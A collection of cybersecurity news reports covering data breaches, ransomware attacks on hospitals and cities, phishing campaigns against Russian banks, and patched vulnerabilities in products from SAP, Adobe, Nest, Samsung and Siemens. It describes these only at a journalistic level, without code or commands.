The hacker appears to have stolen at least 6.5 million accounts, although Black Luster Soldier cautioned that not all of those necessarily correspond to individual players.
""At the moment, the claim that information has been breached for 6.5 DN million accounts appears to be accurate.
Note that many accounts are duplicates owned by the same user or were never actually logged in, so this number is inflated,"" they said.
The data includes user email addresses and passwords hashed with the notoriously weak MD5 algorithm, meaning hackers will likely be able to obtain a number of users' plaintext passwords as well.
Paid breach notification service LeakBase provided Motherboard with a small sample of accounts for verification purposes.
Motherboard attempted to contact over 50 alleged victims, but has not received a reply at the time of writing.
Black Luster Soldier's working theory is that the hacker used a vulnerability in MySQL to obtain the data.
The lesson: As Black Luster Soldier advised, users should change their passwords on any other services with the same credentials as Dueling Network.
Even if data from the breached site isn't all that valuable in and of itself, if someone has used the same password on another site, hackers can easily try to access other more serious accounts too.

The United States’ National Security Agency has linked North Korea to the WannaCry ransomware attack that had affected more than 3,00,000 people worldwide in May, reported The Washington Post. 
The NSA analysed tactics, techniques and targets that suggest  the Reconnaissance General Bureau, North Korea’s spy agency, was behind the attack.  
The assessment was issued internally last week and has not yet been made public.  According to the assessment, the cyber actors, suspected to be sponsored by the RGB, were behind two versions of WannaCry.  
The Shadow Brokers, a hacking group believed to be behind a massive dump of National Security Agency cyber-weapons and software, were responsible for releasing the vulnerability in the computer systems used by government agencies and other companies. The vulnerability had led to WannaCry being able to replicate itself and causing massive damage internationally. The vulnerability was referred to by the NSA as “EternalBlue”.
WannaCry is a malicious software that had crippled systems worldwide and affected more than 150 countries in a cyber attack in May. It had locked data on computers it struck, which could only be released after a paying a ransom in bitcoins. The major cyber attack had targeted several nations, bringing operations at hospitals, telecommunications firms and other companies to a halt.

Officials at a medical practice in Blue Springs say they are taking steps to strengthen privacy protections after a ransomware attack affected nearly 45,000 patients.
Blue Springs Family Care discovered in May that hackers had installed malware and ransomware encryption programs on its computer system, giving them full access to patient records.
Ransomware is a kind of malware that locks up a computer. The attackers typically demand a ransom, often in Bitcoin or other cryptocurrencies, as a condition of unlocking the computer and allowing access to the system.
Melanie Peterson, Blue Springs Family Care’s privacy officer, says the medical practice did not pay a ransom. Rather, it was able to use backups to regain computer access.
In a letter to patients, Blue Springs Family Care said it had no evidence patients’ information had been used by unauthorized individuals. But it said it had taken steps to strengthen its defenses against similar attacks in the future.
Peterson says the family medical practice has essentially rebuilt its computer system from scratch “to make sure that no traces of any kind of virus were left in the system.”
The number of affected patients was as large as it was because the medical practice is required to keep medical records going back 10 years.
Peterson says both the FBI and Blue Springs Police Department were notified of the attack. So far, the hackers have not been identified, she says.
Blue Springs Family Care’s computer vendor discovered the ransomware attack on May 12. In its letter to patients, Blue Springs Family Care said it hired a forensic IT company to help quarantine the affected systems and to install software to monitor whether any unauthorized person was accessing the system.
The attack on Blue Springs Family Care was not an anomaly. Health care businesses in particular have been targeted by ransomware attacks. According to Beazly, a cybersecurity insurance company, 45 percent of ransomware attacks in 2017 targeted the health care industry. Financial services, which accounted for 12 percent of ransomware attacks, were a distant second.
Last month, Cass Regional Medical Center in Harrisonville, Missouri, reported a ransomware attack had briefly cut off access to its electronic health record system on July 9. Hospital officials said there was no indication patient data was accessed.
Cass Regional was just the latest of many Missouri health care institutions targeted in the last few months by cyber-attackers. Others include Children’s Mercy Hospital in Kansas City, Barnes Jewish Hospital in St. Louis, Barnes-Jewish St. Peters Hospital in St. Peters and John J. Pershing VA Medical Center in Poplar Bluff.
In Kansas, the Cerebral Palsy Research Foundation of Kansas, the Kansas Department for Aging and Disability Services, Atchison Hospital Association and a private medical practice in McPherson have all been hit with cyberattacks since March.
“If you think about what’s in a health or medical record, there’s a lot of information that could be used to create or falsify documents on an individual,” says Madeline Allen, an assistant vice president in the cybertech practice at Lockton Companies, a Kansas City-based insurance broker.
“So think about your medical record that contains not only your health information but also your name and address, your social security number, your date of birth, oftentimes a driver’s license number.
“All of those things can be used to impersonate you, whether it be to open a line of credit, apply for a loan, file a tax return – all of those things. Pretty much everything you need would be found in your health record,"" Allen says. ""If you can get a full health record on someone, it’s pretty valuable information to the bad guys as they’re looking to monetize that information.”
For health care institutions, Allen says, it’s not so much a question of whether they will be attacked as when. As such, she says, apart from instituting technical measures, the most important thing they can do to ward off cyberattacks is to educate their employees.
“Let them know that people are constantly trying to attack from all angles and the attacks are pretty sophisticated,” she says. “It’s very easy to click on a link thinking it’s legitimate or respond to an email that looks legitimate when in fact it’s not. So I think the education of employees and staff is perhaps the biggest step that health care facilities can take.”

Organizations use them regardless of their size; from MetLife, LinkedIn, City of Chicago, Expedia, BuzzFeed to KMPG and The Guardian there are several other high-profile platforms that are currently taking advantage of MongoDB.
At the same time, having a high-profile customer doesn’t mean that platform is completely secure.
That’s why in 2016, in two different incidents, hackers leaked more than 36 million and 58 million accounts respectively from unsecured MongoDB.
More: LG Smart TV Screen Bricked After Android Ransomware Infection
Now, unsecured MongoDB databases are being hijacked by a hacker, who is not only wiping out these databases but also storing copies of them and asking for a ransom of 0.2 bitcoins (roughly US$ 211) from admins in exchange of the lost data.
Those admins who haven’t created backups of these databases are seriously helpless because the rate of Bitcoin is also increasing and the latest rate is 1 Bitcoin = USD1063.93.
The hacking campaign was discovered by security researcher Victor Gevers, co-founder of GDI Foundation, a non-profit organization.
Gevers notified owners about the presence of vulnerable, non-password-protected MongoDB databases and also informed that around 200 of these installations have been wiped out by the hacker.
Gevers believes that the hacker(s) might be utilizing an automation tool but they manually select their target databases.
Hacker seems to be interested in databases that contain important information/data or he chooses companies that are most likely in a position to pay the ransom to get their data back.
In a conversation with SecurityWeek, Gevers said that “They use some sort of automation tool, but they also do some of the work manually.
If they used a fully automated tool, we might have seen all exposed MongoDB databases being hijacked in one swift move”.
But that was old news; as per recent tweet by Shodan founder John Matherly, approx.
It must be noted that Shodan is the platform where a majority of MongoDB instances can be located.
As of now, 16 admins/organizations have already paid the ransom to obtain the lost data.
The attacks on MongoDB databases have been going on for more than a week and servers from across the globe have been targeted.
Researchers believe that the attacker, who uses the alias “harak1r1” does not encrypt the stolen data but runs a script, which replaces the database content with the ransom note.

Banks in Russia today were the target of a massive phishing campaign that aimed to deliver a tool used by the Silence group of hackers. The group is believed to have a background in legitimate infosec activities and access to documentation specific to the financial sector.
The fraudulent emails purported to come from the Central Bank of Russia (CBR) and contained a malicious attachment. The message body lured the recipients to open the attachment in order to check the latest details on the ""standardization of the format of CBR's electronic communications.""
Email authentication mechanism saves the day
International cybersecurity company Group-IB investigated the attack and noticed that the style and format of the fake communication were very similar to the official CBR correspondence. This supports the theory that the attackers had access to legitimate emails from CBR.
If Silence hackers have any ties with the legal side of reverse engineering and penetration testing, it is very likely that they are familiar with the documentation used by financial institutions and with how banking systems work.
In a report published today, Group-IB says that the attackers spoofed the sender's email address but the messages did not pass the DKIM (DomainKeys Identified Mail) validation. DKIM is a solution specifically designed to prevent forged email addresses by adding to the message a signature that confirms its authenticity.
Banks see more spear-phishing from a different group
The Silence hackers are not the only ones trying their spear-phishing game on Russian banks. On October 23, another notorious group, MoneyTaker, ran a similar campaign against the same type of targets.
Their message spoofed an email address from the Financial Sector Computer Emergency Response Team (FinCERT) and contained five attachments disguised as documents from CBR.
""Three out of five files were empty decoy documents, but two contained a download for the Meterpreter Stager. To carry out the attack, hackers used self-signed SSL certificates,"" says Rustam Mirkasymov, Group-IB Head of Dynamic Analysis of malware department and threat intelligence expert.
These clues, along with server infrastructure associated with the MoneyTaker group, allowed the security experts to identify the perpetrator.
As in the case of Silence, this attacker is also thought to have had access to CBR documents, most likely from compromised inboxes of Russian banks employees. This allowed them to craft messages that would pass even eyes trained in spotting fraudulent emails.
Silence and MoneyTaker are the most dangerous threats to banks
According to Group-IB, multiple groups use the Central Bank of Russia in spear-phishing operations, and for good reason, since the organization dictates regulations to financial institutions in the country and maintains a constant communication flow with them.
Mirkasymov says that Silence and MoneyTaker are the most dangerous of all groups that threaten financial organizations. Referring to the latter, the expert says that its repertoire also includes drive-by attacks and testing the network for vulnerabilities. The goal is to access the internal nodes that enable them to withdraw money from ATMs, process cards or interbank transfers.
Although Silence uses mainly phishing, they are more careful about crafting the message, paying attention to both content and design, adds Group-IB's threat intelligence expert.

Several developments this week recentered the security spotlight on some of the enterprise's most critical business systems as cybersecurity experts deal with the reality that enterprise resource planning (ERP) software needs heightened attention.
On the vulnerability front, SAP this week patched a new, highly critical vulnerability for SAP HANA with one of the highest severity ratings available.
Meanwhile, a new survey report shows that security professionals are finally waking up to the fact that attackers are looking to leverage vulnerabilities like these, with indicated expectations of increased ERP attacks in the near future.
SAP HANA is an in-memory data platform used by enterprises to crunch data from across their business software stacks.
Organizations use it to perform advanced analytics that inform critical business processes and fuel innovative applications, and as such it contains some of the most sensitive data pertaining to customers, business processes and intellectual property.
The major vulnerability was discovered by ERP security firm Onapsis in SAP HANA's User Self-Service component and scored a CVSS vulnerability rating of 9.8, garnering a Hot News designation in this month's SAP Security Notes.
If exploited, it would allow full remote compromise without access to any credentials.
""This level of access would allow an attacker to perform any action over the business information and processes supported by HANA, including creating, stealing, altering, and/or deleting sensitive information,"" says Sebastian Bortnik, head of research for Onapsis.
SAP patched the problem in this month's round of SAP Security Notes, which included 35 vulnerabilities across its portfolio.
Among them there were eight vulnerabilities with a high priority rating.
Last year, the threats posed by these vulnerabilities tipped over from the theoretical realm to one of documented reality when US-CERT released a report that warned of at least 36 organizations worldwide impacted by attacks that leveraged a vulnerability in SAP's Invoker Servlet functionality running on SAP Java platforms.
This week, a new report from Crowd Research Partners found that 89% of security experts anticipate more attacks against ERP systems.
Approximately 1 in 3 experts expect a significant increase in these attacks.
As things stand, most enterprises are still dreadfully unprepared for any attacks, let alone an increased volume of them.
A report last year from Ponemon Institute showed that more than half of enterprises admit it would take their firm a year or longer to detect a breach in the SAP platform.

The murky ecosystem of ransomware payments comes into focus in new research led by Damon McCoy, an assistant professor of computer science and engineering at the NYU Tandon School of Engineering. Ransomware attacks, which encrypt and hold a computer user's files hostage in exchange for payment, extort millions of dollars from individuals each month, and comprise one of the fastest-growing forms of cyber attack.
In a paper slated for presentation at the IEEE Symposium on Security and Privacy in May, McCoy and a team including researchers from the University of California, San Diego; Princeton University; Google; and the blockchain analytics firm Chainalysis provide the first detailed account of the ransomware payment ecosystem, from initial attack to cash-out.
Key findings include the discovery that South Koreans are disproportionately impacted by ransomware campaigns, with analysis revealing that $2.5 million of the $16 million in ransomware payments tracked by the researchers was paid in South Korea. The paper's authors call for additional research to determine the reason that so many South Koreans are victimized and how they can be protected.
The team also found that most ransomware operators used a Russian bitcoin exchange, BTC-E, to convert bitcoin to fiat currencies. (BTC-E has since been seized by the FBI.) The researchers estimate that at least 20,000 individuals made ransomware payments over the past two years, at a confirmed cost of $16 million, although the actual payment total is likely far higher.
McCoy and his collaborators took advantage of the public nature of the bitcoin blockchain technology to trace ransom payments over a two-year period¬. Bitcoins are the most common currency of ransomware payments, and because most victims do not own them, the initial bitcoin purchase provides a starting point for tracking payments. Each ransomware victim is often given a unique payment address that directs to a bitcoin wallet where the ransom is collected. The research team tapped public reports of ransomware attacks to identify these addresses and correlate them with blockchain transactions.
To boost the number of transactions available for analysis, the team also executed real ransomware binaries in a controlled experimental environment, essentially becoming victims themselves and making micropayments to real ransom wallets in order to follow the bitcoin trail. ""Ransomware operators ultimately direct bitcoin to a central account that they cash out periodically, and by injecting a little bit of our own money into the larger flow we could identify those central accounts, see the other payments flowing in, and begin to understand the number of victims and the amount of money being collected,"" McCoy said.
The research team acknowledged that ethical issues prevent exploration of certain aspects of the ransomware ecosystem, including determining the percentage of victims who actually pay to recover their files. McCoy explained that despite having the ability to check for activity connected to a specific payment address, doing so would effectively ""start the clock"" and potentially cause victims to either pay a double ransom or lose the opportunity to recover their files altogether.
Criminal use of cryptocurrencies is one of McCoy's research focuses. He and fellow researchers previously tracked human traffickers through their use of Bitcoin advertising.

Disney boss Bob Iger has said the mass media giant is being targeted by hackers who are trying to extort money from the firm by threatening to release a film they claim to have stolen.
The CEO of the entertainment behemoth told ABC employees of the stand-off at a town hall meeting in New York, multiple sources told The Hollywood Reporter.
The hackers are said to have demanded a substantial payment in Bitcoin, and threatened to release five minutes of the unnamed film and then subsequent 20-minute chunks if their demands aren’t met.
There are rumors circulating that the film in question could be upcoming blockbuster Pirates of the Caribbean: Dead Men Tell No Tales, although the hackers are running out of time if so as it’s due to open next Friday.
The news calls to mind a similar incident last month when a hacker uploaded the upcoming series of Netflix prison drama Orange is the New Black to The Pirate Bay after the streaming giant refused to pay up.
In that instance, Netflix claimed that “a production vendor used by several major TV studios had its security compromised”, highlighting the need for organizations in the entertainment sector to revisit their cyber-defenses and those of their partners.
Mark James, security specialist at Eset, argued that anything of high value will be a target for thieves, be it digital or physical.
“Disney has refused to pay the ransom and rightly so. If you’re going to download the film from an unofficial or dodgy source anyway then a month before or a month after is not going to make much of a difference,” he added.
""The film industry has been plagued with piracy issues as early as the 1960s and this isn't going to change anytime soon. Paying the ransom or indeed any ransom is generally frowned upon for many reasons. Funding other criminal activity, rewarding the bad guys or funding future attacks are all good reasons to not pay as the chances are it’s going to get released anyway.”

INDIANAPOLIS — An Indiana hospital said it paid a $50,000 ransom to hackers who hijacked patient data.
The ransomware attack accessed the computers of Hancock Health in Greenfield through an outside vendor's account Thursday. It quickly infected the system by locking out data and changing the names of more than 1,400 files to ""I'm sorry.""
The virus demanded four bitcoins in exchange for unlocking the data, which included patient medical records and company emails. The hospital paid the amount, about $50,000 at the time, early Saturday morning, said Rob Matt, senior vice president and chief strategy officer.
""It wasn't an easy decision,"" Matt said. ""When you weigh the cost of delivering high-quality care ... versus not paying and bearing the consequences of a new system.""
The data started unlocking soon after the money was transferred, Matt said.
""The amount of the ransom was reasonable in respect to the cost of continuing down time and not being able to care for patients,"" Matt said.
Hancock Health includes about two dozen health care facilities, including Hancock Regional Hospital in Greenfield, about 15 miles east of Indianapolis.
The health system said in a news release that patient data was not compromised. Life support and other critical hospital services were not affected, and patient safety was never at risk.
Ransomware is a growing digital extortion technique that affected tens of thousands of Americans in 2016, USA TODAY reported. 
Criminals use various phishing methods through emails or bogus links to infect victims with malicious software.
The virus infects the computer network by encrypting files or locking down the entire system. Victims log on and receive a message telling them the files have been hijacked and to get the files back they will have to pay.
Hospitals are a frequent target of these attacks. In May, a ransomware virus affected more than 200,000 victims in 150 countries, including more than 20% of hospitals in the United Kingdom. That attack was later traced to North Korea.
Hancock Health said it worked with the FBI and hired an Indianapolis cybersecurity expert for advice on how to respond to the attack.
The systems were back Monday after paying the ransom.
“We were in a very precarious situation at the time of the attack,"" Hancock Health CEO Steve Long said in a statement.
""With the ice and snowstorm at hand, coupled with the one of the worst flu seasons in memory, we wanted to recover our systems in the quickest way possible.""
Hospital officials could have retrieved back up files, but Long said they feared restoring the hijacked data would take too long.

Adobe has patched two critical flaws in Acrobat and Reader that warrant urgent attention.
Officially, Adobe patches security vulnerabilities around the middle of each month to coordinate with Microsoft’s Patch Tuesday, but recently it’s become almost routine for the company to issue out-of-band updates in between.
APSB19-02, the first of such updates to reach customers in the new year, addresses critical flaws with a priority rating of ‘2’.
That means that the flaw is potentially serious, but Adobe hasn’t detected any real-world exploits (the latter would entail issuing an ‘emergency’ patch with a ‘1’ rating).
The first flaw, identified as CVE-2018-16011, is described by Adobe as a use-after-free bug that could be exploited using a maliciously crafted PDF to take control of a target system with their malware of choice.
The second, CVE-2018-16018 (replacing CVE-2018-19725), is a security bypass targeting JavaScript API restrictions on Adobe Reader DC and seems to have been in the works since before Christmas, affecting all versions of Window and macOS Acrobat DC/Reader 2019.010.20064 and earlier, the fix in both cases is to update to 2019.010.20069.
For the legacy Acrobat/Reader 2017 2017.011.30110 and Acrobat/Reader DC 2015 2015.006.30461, the updates take those to 2017.011.30113 and 2015.006.30464 respectively.
As critical flaws with a ‘2’ rating, there is a suggested 30-day window within which to apply the updates, but it’s worth bearing in mind that a new round of patches will likely be offered for Adobe products tomorrow as part of Patch Tuesday.
In December’s Patch Tuesday, Adobe released a not inconsiderable 87 patches, including 39 rated critical.
Only days before, Adobe issued an emergency Flash patch for a zero-day vulnerability that was being exploited, while in November Flash received a separate patch for one whose exploitation was believed to be imminent.

The first reported instance of a cyber attack on a utilities provider will happen this year.
That’s according to Perry Stoneman, Global Head of Utilities at consulting firm Capgemini, who told ELN it would likely take the form of a ransomware attack.
This is when computer systems are hacked by criminals who then demand a sum of money to avoid a major city having its power cut off.
Mr Stoneman believes the hackers would want their attack to be “visible, attention-catching and newsworthy” – turning the lights out is just that.
He said: “It could be something more malicious than just wanting money.
Mr Stoneman told ELN although the risks do increase as energy systems become more dependent on technology, the main reason the threat is growing is because there are larger numbers of hackers with more advanced skills than ever before.

Google Nest’s Dropcam, Dropcam Pro, Nest Cam Outdoor and Nest Cam Indoor security cameras can be easily disabled by an attacker that’s in their Bluetooth range, a security researcher has found.
The vulnerabilities are present in the latest firmware version running on the devices (v5.2.1).
They were discovered by researcher Jason Doyle last fall, and their existence responsibly disclosed to Google, but have still not been patched.
The first two flaws can be triggered and lead to a buffer overflow condition if the attacker sends to the camera a too-long Wi-Fi SSID parameter or a long encrypted password parameter, respectively.
That’s easy to do as Bluetooth is never disabled after the initial setup of the cameras, and attackers (e.g.
burglars) can usually come close enough to them to perform the attack.
Triggering one of these flaws will make the devices crash and reboot.
The third flaw is a bit more serious, as it allows the attacker to force the camera to temporarily disconnect from the wireless network to which it is connected by supplying it a new SSID to connect to.
If that particular SSID does not exist, the camera drops its attempt to associate with it and return to the original Wi-Fi network, but the whole process can last from 60 to 90 seconds, during which the camera won’t be recording.
Unfortunately, Bluetooth can’t be disabled on these cameras, so there is little users can do to minimize this particular risk.
Nest has apparently already prepared a patch but hasn’t pushed it out yet.
It is supposedly scheduled to be released soon, but no definite date has been offered.

A single SMS can force Samsung Galaxy devices into a crash and reboot loop, and leave the owner with no other option than to reset it to factory settings and lose all data stored on it.
This is because there are certain bugs in older Samsung Galaxy phones and tablets that can be triggered via SMS, and used by attackers to force maliciously crafted configuration messages onto the users’ device.
The bugs allow these types of messages to be executed without user interaction.
As the ContextIS researchers who discovered the vulnerabilities explained, this avenue of attack can be abused by crooks to hold users’ devices for ransom.
“First a ransom note is sent, if ignored then the malicious configuration message can be sent,” they noted.
If the victim pays up, a configuration message can later be sent to stop the rebooting.
The vulnerabilities in question, CVE-2016-7988 and CVE-2016-7989, can be triggered through SMS on the S4, S4 Mini, S5 and Note 4, but not on newer Samsung devices.
“It’s worth noting that although newer phones such as the S6 and S7 aren’t affected over the air, [a similar result] could be accomplished by a malicious app abusing CVE-2016-7988,” they added.
These specific issues are related to modifications Samsung made to to the Android telephony framework and are found in a Samsung-specific application for handling carrier messages.
“We responsibly disclosed this to Samsung who handle the patching process with carriers.
We extended our standard 90 day disclosure policy to allow Samsung time to arrange for the patches to be made available,” the researchers told Help Net Security.
Whether all users of vulnerable devices have received the patches is difficult to tell.
“The Android update process is a bit of a minefield and is well illustrated in this HTC diagram,” they commented.
They also noted that it’s possible that the same avenue of attack could be abused to target other devices – it all depends on how this same technology is handled by other vendors.

Skirt Club is a place for lesbian and bisexual women to play out their fantasies, and it’s known for being discreet.
But that doesn’t seem to apply when it comes to the online privacy component, according to Vice Germany.
All the data collected by us is stored on a secure server.
Not enough, according to Vice, which reported that Skirt Club kept members’ photos easily accessible online.
With more than 5,000 members worldwide – many of whom are not open about this part of their lives – the potential privacy violations are significant.
Vice included an example of those compromised: a 39-year-old woman who had been married for 15 years and said in her profile that “No one knows that I am bi in my environment.
Vice Germany investigated after anonymous sources contacted the publication to voice concerns with the site, which went dark around 1 pm.
Vice published a feature on Skirt Club in October 2016, which is probably why it was contacted about this.
After they looked into those claims, the editors found that at that time, thousands of personal images that members had uploaded in order to join Skirt Club were accessible to non-members – photos of users partially or fully naked, often recognizable, sometimes even with their names mentioned in the image.
You didn’t need to hack the site to see – they weren’t password protected and anyone curious enough to make a bit of an effort could view and download the photos.
Vice was particularly critical of how Skirt Club dealt with the issue:
After VICE Germany reported the security issues to Skirt Club in mid-December 2016, it took Skirt Club more than three weeks to patch the issue.
The users’ pictures and data aren’t accessible any more, but the security issue isn’t resolved completely – and at the time of publication, Skirt Club hasn’t informed users of the former problem.
Naked Security reached out to Skirt Club, which directed press inquiries toward its attorney:
Skirt Club is directing all media enquiries to its lawyer, Dr Sebastian Gorski at Schertz Bergmann Rechtsanwälte in Berlin.

It is particularly worrying for banks that the disruption lasted three days.
Lloyds revealed little at the time, despite a flood of Twitter complaints.
But it has emerged that the National Cyber Security Centre is working with the bank on the attack.
Despite speculation that a number of banks may have been targeted, it appears that the internet gang concentrated its fire on Lloyds.
In the past, denial of service attacks have been perpetrated by customers with a grudge or by blackmailers, but there is no indication from Lloyds that a ransom demand was received.
At the time, the bank was adamant that the ""vast majority"" of users were able to gain access to their accounts and move money around as normal.
It's likely that systems engineers blocked all internet traffic from overseas locations where the attacks seemed to be coming from, halting the disruption at least temporarily before the attackers switched their activity elsewhere.
In contrast to the hacking of Tesco Bank in November, in which £2.5m was taken, there is no indication that criminals got their hands on cash in Lloyds bank accounts.
However, the new National Cyber Security Centre, part of GCHQ and the UK's authority on cyber-security, is understood to be working with Lloyds on security after the attack.
Lloyds Banking Group issued the following statement: ""We experienced intermittent service issues with internet banking between Wednesday morning and Friday afternoon the week before last and are sorry for any inconvenience caused.
""We had a normal service in place for the vast majority of this period and only a small number of customers experienced problems.
We will not speculate on the cause of these intermittent issues.""

As many attest, they just won’t leave TalkTalk customers alone, cold-calling them on a scale the BBC recently described as “industrial”.
The caller claims to be a TalkTalk engineer and to have detected a router or malware issue on the user’s computer that requires immediate intervention.
The customer is persuaded to turn on their computer and run the Windows Event Viewer to perform bogus diagnostics before being asked to install one of a range of remote desktop support tools.
This type of application gives the scammers complete remote control over the victim’s PC, at which point they are free to steal data, install malware and, in some cases, engineer the user into logging into online banking or transferring money.
A popular choice with the fraudsters since at least 2015 has been TeamViewer, so much so that on March 8, TalkTalk abruptly started blocking the application from functioning on its network in a desperate effort to stem a tide of abuse customers had started complaining about.
TeamViewer’s block was removed on Thursday after complaints by the company, but that didn’t stop TalkTalk  from quietly blocking equivalents such as AnyDesk, whose users started noticing unexpected connection issues around the same time.
Tech support fraud, or “vishing”, has been around for years, so is there much new to be worried about here?
The unsettling aspect of the TalkTalk attacks is that the fraudsters allegedly accessed stolen data, which means they immediately sounded more convincing to their victims.
If confirmed, this means that fraudsters have been able to synthesise old-fashioned tech support social engineering with data breach cybercrime to create something novel and perhaps unstoppable.
It also seems to be easy to abuse remote support applications, which have flourished on the back of untraceable freemium accounts.
It’s not clear how these companies detect misuse but clearly more needs to be done.

The industrial company on Tuesday released mitigations for eight vulnerabilities overall.
Siemens AG on Tuesday issued a slew of fixes addressing eight vulnerabilities spanning its industrial product lines. The most serious of the patched flaws include a cross-site scripting vulnerability in Siemens’ SCALANCE firewall product. The flaw could allow an attacker to gain unauthorized access to industrial networks and ultimately put operations and production at risk.
The SCALANCE S firewall is used to protect secure industrial networks from untrusted network traffic, and allows filtering incoming and outgoing network connections in different ways. Siemens S602, S612, S623, S627-2M SCALANCE devices with software versions prior to V4.0.1.1 are impacted.
Researchers with Applied Risk, who discovered the flaw, said that vulnerability exists in the web server of the firewall software. An attacker can carry out the attack by crafting a malicious link and tricking an administrator – who is logged into the web server – to click that link. Once an admin does so, the attacker can execute commands on the web server, on the administrator’s behalf.
“The integrated web server allows a cross-site scripting attack if an administrator is misled into accessing a malicious link,” Applied Risk researcher Nelson Berg said in an analysis of the flaw. “Successful exploitation may lead to the ability to bypass critical security measures provided by the firewall.”
Exploitation of this vulnerability could ultimately enable threat actors to bypass critical security functions provided by the firewall, potentially providing access to industrial networks and putting operations and production at risk.
The vulnerability, CVE-2018-16555, has a CVSS score which Applied Risk researcher calculates to be 8.2 (or high severity).
That said, researchers said a successful exploit is not completely seamless and takes some time and effort to carry out – for an attacker to exploit the flaw, user interaction is required and the administrator must be logged into the web interface.
Researchers said that no exploit of the vulnerability has been discovered thus far.
Siemens addressed the reported vulnerability by releasing a software update (V4.0.1.1) and also advised customers to “only access links from trusted sources in the browser you use to access the SCALANCE S administration website.”
The industrial company also released an array of fixes for other vulnerabilities on Tuesday. Overall, eight advisories were released by the US CERT.
Another serious vulnerability (CVE-2018-16556) addressed was an improper input validation flaw in certain Siemens S7-400 CPUs. Successful exploitation of these vulnerabilities could crash the device being accessed which may require a manual reboot or firmware re-image to bring the system back to normal operation, according to the advisory.
“Specially crafted packets sent to Port 102/TCP via Ethernet interface, via PROFIBUS, or via multi-point interfaces (MPI) could cause the affected devices to go into defect mode. Manual reboot is required to resume normal operation,” according to US Cert.
An improper access control vulnerability that is exploitable remotely in Siemens IEC 61850 system configurator, DIGSI 5, DIGSI 4, SICAM PAS/PQS, SICAM PQ Analyzer, and SICAM SCC, was also mitigated.
The vulnerability, CVE-2018-4858, has a CVSS of 4.2 and exists in a service of the affected products listening on all of the host’s network interfaces on either Port 4884/TCP, Port 5885/TCP, or Port 5886/TCP. The service could allow an attacker to either exfiltrate limited data from the system or execute code with Microsoft Windows user permissions.
Also mitigated were an improper authentication vulnerability (CVE-2018-13804) in SIMATIC IT Production Suite and a code injection vulnerability(CVE-2018-13814) in SIMATIC Panels and SIMATIC WinCC that  could allow an attacker with network access to the web server to perform a HTTP header injection attack.

 When a representative from the Internal Revenue Service arrived at the Manatee County School Board offices last week to pick up information on a cyber attack in January, Chief Information Officer Patrick Fletcher gave him a double take.
On Feb 3, district administrators learned that two payroll employees had fallen for an email phishing scam. A hacker posing as Superintendent Diana Greene sent an email to one of the employees, requesting all W-2 forms for district employees. The Manatee payroll employee complied, and with the help of another employee, sent the hacker a PDF file containing all 7,700 W-2s for any employee who worked in the district in 2016.
Because of the freshness of the attack, Fletcher wasn’t taking any chances. Rather than hand over the sensitive information to the man claiming to be from the government, Fletcher drove the file down to the IRS office himself.
“Now we are going to be like Fort Knox,” said Deputy Superintendent Ron Ciranna.
That vigilance may seem like too little, too late to the 7,700 district employees whose information was leaked through what many have characterized as an obvious scam.
But school district officials say they are doing everything they can to help employees regroup after the attack. The district notified employees as soon as administrators learned of the attack and purchased identity protection and credit monitoring for all employees, and Ciranna said the district will be increasing its cyber-security training.

WCry, the National Security Agency exploit-powered ransomware worm that began spreading worldwide on Friday, had reportedly affected hundreds of thousands of computers before the weekend, but the malware had only brought in about $20,000 in ransom payments. However, as the world returned to the office on Monday, those payments have been rapidly mounting, based on tracking data for the three Bitcoin wallets tied by researchers to the malware. As of noon Eastern Time on Monday, payments had reached an estimated $71,000 since May 12. So far, 263 payments have been made to the three wallets linked to the code in the malware.
The payment history for each wallet shows individual transactions ranging mostly between 0.16 and 0.34 Bitcoin (approximately $300 and $600, respectively), with the number of larger payments increasing over time. Different ransom amounts have been presented to victims, and the price of Bitcoin has climbed dramatically over the past week, causing some variation in the payment sizes.
According to researchers at Symantec Security Response, tracking ransom transactions would have been much more difficult if not for a bug in code that was supposed to create an individual bitcoin wallet for each victim:
#WannaCry has code to provide unique bitcoin address for each victim but defaults to hardcoded addresses as a result of race condition bug
— Security Response (@threatintel) May 16, 2017
Because the code failed, it defaulted over the three preset wallets. This, along with the ""killswitch"" code that was left in the initial wave of WCry malware, may be an indication that the malware wasn't yet fully tested when it was launched.

Do you trust your Android VPN client to keep your data secure and your online browsing private?
The researchers have contacted the developers of the apps found sporting some or all of these issues, and some have reacted by fixing the vulnerabilities.
Most of them, though, did not respond, and some responded only to confirm the findings and to offer justification for the choices they make about how they operate the service.
“Despite the fact that Android VPN-enabled apps are being installed by millions of mobile users worldwide, their operational transparency and their possible impact on user’s privacy and security remains ‘terra incognita’ even for tech-savvy users,” the researchers pointed out, and added that judging by the analysis of the user reviews and ratings of these apps, most users are unaware that they might be risking their security and privacy.

Federal officials, Microsoft and Cisco are working with the city of Atlanta to resolve the attack, but Atlanta's mayor won't say if the city paid the $51,000 ransom.
As of Saturday, Atlanta officials and federal partners were still “working around the clock” to resolve the ransomware attack on city computers that occurred around 5 a.m. on Thursday, March 22, and encrypted some financial and person data.

    — ATLPublicWorks (@ATLPublicWorks) March 24, 2018
On Thursday, the official investigation included “the FBI, U.S. Department of Homeland Security, Cisco cybersecurity officials and Microsoft to determine what information has been accessed and how to resolve the situation.”
A city employee sent WXIA a screenshot of the ransom demand, which included a pay-per-computer option of $6,800 or an option to pay $51,000 to unlock the entire system.
CBS 46 reported that the ransom demand and instruction said:
    Send .8 bitcoins for each computer or 6 bitcoins for all of the computers. (That's the equivalent of around $51,000.)
    After the .8 bitcoin is sent, leave a comment on their website with the provided host name.
    They’ll then reply to the comment with a decryption software. When you run that, all of the encrypted files will be recovered.
On Friday, March 23, city employees were handed a printed notice as they walked through the front doors. They were told not to turn on their computers until the issue was resolved. Officials were still unsure who was behind the attack.
Mayor Keisha Lance Bottoms advised city employees and customers to monitor their personal information, although there was no evidence to show customer or employee data was compromised. Mayor Bottoms clarified what services had not been impacted and were still available to residents and which ones had been impacted.
Mayor Bottoms will not say if Atlanta intends to pay the ransom demand, saying, “We will be looking for guidance from, specifically, our federal partners on how to best navigate the best course of action.”
During a press conference, Bottoms said, “What we want to make sure of is that we aren’t putting a Band-Aid on a gaping wound.” She then turned the press conference over to Richard Cox, the City of Atlanta's chief operations officer; the poor dude is brand new to serving as Atlanta’s COO. He confirmed the existence of the ransom demand but would not reveal the contents.

Colorado investigators call in FBI, work through the night.
Colorado Department of Transportation employees spent a second day offline Thursday as security officials investigated the damage done by a ransomware virus that hijacked computer files and demanded payment in bitcoin for their safe return.
The state’s Office of Information Technology, which reached out to the FBI for assistance, are still investigating the attack and have not paid a cent to attackers — nor do they plan to, said Brandi Simmons, an OIT spokeswoman.
